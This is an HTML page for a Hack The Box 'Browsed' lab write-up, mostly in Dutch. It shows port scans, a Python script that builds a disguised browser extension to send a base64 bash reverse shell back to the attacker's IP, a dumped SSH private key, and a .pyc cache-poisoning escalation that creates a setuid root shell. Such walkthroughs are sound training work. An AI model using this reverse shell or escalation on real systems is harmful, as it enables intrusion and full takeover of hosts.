@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Browsed] └─$ nmap 10.129.38.0 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 17:55 CET Nmap scan report for 10.129.38.0 Host is up (0.032s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-browsed/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Browsed] └─$ nmap 10.129.38.0 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 17:55 CET Nmap scan report for 10.129.38.0 Host is up (0.032s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="1374">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/Browsed] └─$ nmap 10.129.38.0 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 17:55 CET Nmap scan report for 10.129.38.0 Host is up (0.032s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-browsed/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed]
+└─$ nmap 10.129.38.0                                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 17:55 CET
+Nmap scan report for 10.129.38.0
+Host is up (0.032s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed]
+└─$ nmap -p22,80 -sCV 10.129.38.0
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 18:00 CET
+Nmap scan report for 10.129.38.0
+Host is up (1.7s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
+|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Browsed
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Ik ben gaan kijken naar de webpagina. Daar kan je zien dat er verschillende keuzes zijn die je kan aanklikken. Als je op de homepage blijft zal je niets kunnen vinden. Ik ben dan nu gaan kijken naar de samples en daar kan je zien dat je samples zult kunnen downloaden die je meer inzicht zullen geven van hoe dat je de extension zult kunnen uploaden.</p>
+<p>![[Pasted image 20260111180707.png]]</p>
+<p>Ik ben dus naar de samples gaan kijken en ik ben deze allemaal eens gaan downloaden. Dit kan je zien aan de onderstaande foto.</p>
+<p>![[Pasted image 20260111181106.png]]</p>
+<p>Ik ben nu 1 van de samples gaan uploaden, maakt niet uit de welke je zal uploaden. Daar zal je kunnen zien dat er een notify request naar een andere htb fqdn gestuurd wordt. Je kan dit zien door in de ouput van de upload te kijken. Ik zal de fqdn nu gaan toevoegen aan de hosts file en kijken wat ik op de andere pagina kan vinden</p>
+<p>![[Pasted image 20260111190221.png]]</p>
+<pre tabindex="0"><code># sudo nano /etc/hosts
+10.129.38.0 browsed.htb browseinternal.htb
+</code></pre><p>Op de nieuwe pagina kan je zien dat het een gitea pagina is. De gitea pagina wordt gerunned op de versie 1.24.5. Ik ben door gebruik te maken van de ffuf tool gaan kijken welke subdirectories er waren op de gitea pagina. Hieronder kan je zien dat er een v2 en een larry directory gevonden wordt.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed/fontify]
+└─$ ffuf -u http://browsedinternals.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac
+
+v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 26ms]
+larry                   [Status: 200, Size: 22468, Words: 1870, Lines: 433, Duration: 398ms]
+</code></pre><p>Ik zal eens gaan kijken wat er op de larry pagina gevonden wordt. aangezien ik voor de v2 momenteel geen rechten heb. Binnen larry kan je zien dat er 1 repo gekent is. Deze repo heeft de naam MarkdownPreview. Ik ben op mijn windows machine een nieuwe dir gaan aanmaken en deze gitea genoemd. Hierin zal ik een git clone doen van de repo die we net gevonden hebben.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed/gitea]
+└─$ git clone http://browsedinternals.htb/larry/MarkdownPreview.git
+Cloning into &#39;MarkdownPreview&#39;...
+remote: Enumerating objects: 15, done.
+remote: Counting objects: 100% (15/15), done.
+remote: Compressing objects: 100% (12/12), done.
+remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (15/15), done.
+</code></pre><p>Na veel opzoek werk heb ik gezien dat er ook niets in de git folder te vinden was. Waarbij ik dus weer naar de oplossing ben gaan zoeken voor een connectie te maken met de server door gebruik te maken van de extensions upload. Hierbij ben ik op de volgende code gekomen waarbij ik mijn ip address ben gaan veranderen in de code, Als ik de code uitvoer zal een .zip file gemaakt worden. Door gebruik te maken van de zip en deze te gaan uploaden op de server zal ik een rce connectie met de server krijgen als de gebruiker larry.</p>
+<p>Code dat ik gebruikt heb voor de .zip file te maken</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed/gitea/MarkdownPreview]
+└─$ cat rce.py 
+import zipfile
+import io
+import base64
+
+def create_shell_extension(my_ip, my_port=&#34;9001&#34;):
+    zip_buffer = io.BytesIO()
+    
+    # 1. The Reverse Shell One-Liner (Standard Bash)
+    # We encode it to avoid breaking the JSON or the URL string
+    raw_shell = f&#34;bash -i &gt;&amp; /dev/tcp/{my_ip}/{my_port} 0&gt;&amp;1&#34;
+    b64_shell = base64.b64encode(raw_shell.encode()).decode()
+    
+    # This is the payload that will be executed on the server
+    # It decodes itself and pipes into bash
+    shell_payload = f&#34;echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash&#34;
+
+    # 2. Manifest V3
+    manifest = &#39;&#39;&#39;{
+        &#34;manifest_version&#34;: 3,
+        &#34;name&#34;: &#34;Security Optimizer&#34;,
+        &#34;version&#34;: &#34;1.1&#34;,
+        &#34;background&#34;: {
+            &#34;service_worker&#34;: &#34;background.js&#34;
+        },
+        &#34;host_permissions&#34;: [&#34;*://127.0.0.1/*&#34;, &#34;*://localhost/*&#34;]
+    }&#39;&#39;&#39;
+
+    # 3. background.js
+    # We will try both the routine path and a potential root injection
+    background = f&#39;&#39;&#39;
+    const ip = &#34;{my_ip}&#34;;
+    const payload = &#34;{shell_payload}&#34;;
+    
+    // We send it via a background loop to ensure it fires
+    async function triggerShell() {{
+        const urls = [
+            `http://127.0.0.1:5000/routines/a[$(${{payload}})]`,
+            `http://127.0.0.1:5000/routines/a&#39;;${{payload}} #`
+        ];
+
+        for (const url of urls) {{
+            fetch(url, {{ mode: &#39;no-cors&#39; }});
+        }}
+    }}
+
+    triggerShell();
+    &#39;&#39;&#39;
+
+    with zipfile.ZipFile(zip_buffer, &#39;a&#39;, zipfile.ZIP_DEFLATED) as zip_file:
+        zip_file.writestr(&#34;manifest.json&#34;, manifest)
+        zip_file.writestr(&#34;background.js&#34;, background)
+
+    with open(&#34;shell_exploit.zip&#34;, &#34;wb&#34;) as f:
+        f.write(zip_buffer.getvalue())
+
+    print(f&#34;[+] shell_exploit.zip created.&#34;)
+    print(f&#34;[+] Listener command: nc -lvnp {my_port}&#34;)
+    print(f&#34;[+] Encoded payload: {shell_payload}&#34;)
+
+if __name__ == &#34;__main__&#34;:
+    # Change this to your HTB Tun0 IP
+    create_shell_extension(&#34;10.10.16.154&#34;, &#34;9001&#34;)
+</code></pre><p>Er wordt hierbij een Shell_exploit.zip aangemaakt, deze zal je moeten gaan uploaden en zal je te zien krijgen op de listener dat je een connectie met de server gemaakt hebt.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/Browsed/gitea/MarkdownPreview/.git]
+└─$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.129.38.0 46768
+bash: cannot set terminal process group (1456): Inappropriate ioctl for device
+bash: no job control in this shell
+larry@browsed:~/markdownPreview$ 
+</code></pre><p>Nu dat we een connectie met de server heb ik de user flag gevonden.</p>
+<pre tabindex="0"><code>larry@browsed:~$ cat user.txt
+cat user.txt
+c86bb3b7111c40627198054093d0ba0e
+</code></pre><p>Binnen de user larry ben ik ook eens gaan kijken of er geen private ssh keys zijn die ik kan gebruiken voor een ssh connectie te maken met de server. Zoals je kunt zien is er een private key gevonden.</p>
+<pre tabindex="0"><code>larry@browsed:~/.ssh$ ls -la
+ls -la
+total 20
+drwx------ 2 larry larry 4096 Jan  6 10:28 .
+drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
+-rw------- 1 larry larry   95 Aug 17 12:49 authorized_keys
+-rw------- 1 larry larry  399 Aug 17 12:48 id_ed25519
+-rw-r--r-- 1 larry larry   95 Aug 17 12:48 id_ed25519.pub
+
+larry@browsed:~/.ssh$ cat id_ed25519
+cat id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
+hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
+AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
+Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p>Ik ben de private key gaan nemen en heb een file gemaakt op mijn eigen machine. Daarin ben ik de private key gaan zetten en heb de file de juiste permissions gegeven zodat ik door het volgende commando te gebruiken mijn connectie kon maken tot de ssh server.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Browsed]
+└─$ sudo chmod 600 private_key
+
+┌──(kali㉿kali)-[~/HTB/Browsed]
+└─$ sudo ssh -i private_key larry@browsed.htb
+The authenticity of host &#39;browsed.htb (10.129.38.0)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:fAVdIajQ8u8b/YUonzJCT/ib1bhL6pA1TZzkODyME4U
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Last login: Sun Jan 11 19:28:15 2026 from 10.10.16.154
+larry@browsed:~$
+</code></pre><p>Ik ben nu gebruik gaan maken van het sudo -l commando voor het zien of ik geen manier heb voor root files te execute zonder dat ik het root password heb, en zoals je kan zien kan de extension_tool.py applicatie gaan uitvoeren zonder admin te zijn.</p>
+<pre tabindex="0"><code>larry@browsed:~$ sudo -l
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+</code></pre><h3 id="python-bytecode-cache-poisoning">Python Bytecode Cache Poisoning</h3>
+<pre tabindex="0"><code>larry@browsed:~$ # Create the exploit script in /tmp
+cat &lt;&lt; &#39;EOF&#39; &gt; /tmp/exploit.py
+import os
+import py_compile
+import shutil
+import sys
+
+ORIGINAL_SRC = &#34;/opt/extensiontool/extension_utils.py&#34;
+MALICIOUS_SRC = &#34;/tmp/extension_utils.py&#34;
+# Fixed the path to __pycache__ based on your previous &#39;ls&#39;
+TARGET_PYC = &#34;/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc&#34;
+
+stat = os.stat(ORIGINAL_SRC)
+target_size = stat.st_size
+
+# The payload that will execute as root
+payload = &#39;import os\ndef validate_manifest(path): os.system(&#34;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#34;); return {}\ndef clean_temp_files(arg): pass\n&#39;
+
+# Padding with comments to match the exact size of the original file
+padding_needed = target_size - len(payload)
+payload += &#34;#&#34; * padding_needed
+
+with open(MALICIOUS_SRC, &#34;w&#34;) as f:
+    f.write(payload)
+
+# Sync timestamps
+os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))
+
+# Compile
+py_compile.compile(MALICIOUS_SRC, cfile=&#34;/tmp/malicious.pyc&#34;)
+
+# Inject
+if os.path.exists(TARGET_PYC):
+    os.remove(TARGET_PYC)
+shutil.copy(&#34;/tmp/malicious.pyc&#34;, TARGET_PYC)
+print(&#34;[+] Poisoned .pyc injected successfully&#34;)
+EOF
+larry@browsed:~$ python3.12 /tmp/exploit.py
+[+] Poisoned .pyc injected successfully
+larry@browsed:~$ sudo /opt/extensiontool/extension_tool.py --ext Fontify
+[-] Skipping version bumping
+[-] Skipping packaging
+</code></pre><pre tabindex="0"><code>larry@browsed:~$ /tmp/rootbash -p
+rootbash-5.2# id
+uid=1000(larry) gid=1000(larry) euid=0(root) egid=0(root) groups=0(root),1000(larry)
+rootbash-5.2# cat /root/root.txt
+2e08bc5d5669f2f2e8255bc0349eae8f
+</code></pre><p>![[Pasted image 20260111204624.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
